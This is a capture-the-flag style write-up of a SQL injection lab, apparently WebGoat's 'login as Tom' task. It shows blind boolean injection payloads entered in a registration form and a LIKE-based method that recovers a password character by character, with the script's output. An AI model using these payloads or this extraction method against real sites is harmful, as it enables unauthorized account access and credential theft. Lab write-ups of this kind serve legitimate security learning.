# Can you login as tom?
SQLi

## Challenge

> We now explained the basic steps involved in an SQL injection. In this assignment you will need to combine all the things we explained in the SQL lessons.\
> Goal: Can you login as Tom?\
> Have fun!

![Login](../screenshots/login.png)
![Register](../screenshots/register.png)

## Solution
We will exploit the register window.

If we try to register username `tom` it gives us this message:

	User tom already exists please try to register with a different username.

And if we try `tom' and '1'='1` we get:

	User tom' and '1'='1 already exists please try to register with a different username.
  
If we try another username such as `daniel' or '1'='1`:

	User daniel' or '1'='1 already exists please try to register with a different username.

But user daniel does not really exist because when running `daniel`we get:

	User daniel created, please proceed to login page
	

We can deduce that in the backend it executes a `select` sentence and when `true`, such as when you `or '1'='1`, it returns the *already exists* message. So if we were to enter `tom' and password='toms password` it would return that the user already exists and we would have toms password. We can bruteforce it trying different passwords until it returns that the user already exists, but the **LIKE** operator reduces the complexity. How this works is better portrayed by examples:

Sentence | Return
-------- | ------
password like '%' | Will return true because `%` represents all possible characters.
password like 'a%' | Will return true if password starts with _a_
password like '%x' | Will return true if password ends with _x_

So if we script this iterating through all characters then we will get how the password starts through each iteration.\

The code is here [script](./advanced.py) and it returns:

	password starts with t 
	password starts with th 
	password starts with thi 
	password starts with this 
	password starts with thisi 
	password starts with thisis 
	password starts with thisisa 
	password starts with thisisas 
	password starts with thisisase 
	password starts with thisisasec 
	password starts with thisisasecr 
	password starts with thisisasecre 
	password starts with thisisasecret 
	password starts with thisisasecretf 
	password starts with thisisasecretfo 
	password starts with thisisasecretfor 
	password starts with thisisasecretfort 
	password starts with thisisasecretforto 
	password starts with thisisasecretfortom 
	password starts with thisisasecretfortomo 
	password starts with thisisasecretfortomon 
	password starts with thisisasecretfortomonl 
	password starts with thisisasecretfortomonly 
	the password is: __thisisasecretfortomonly__



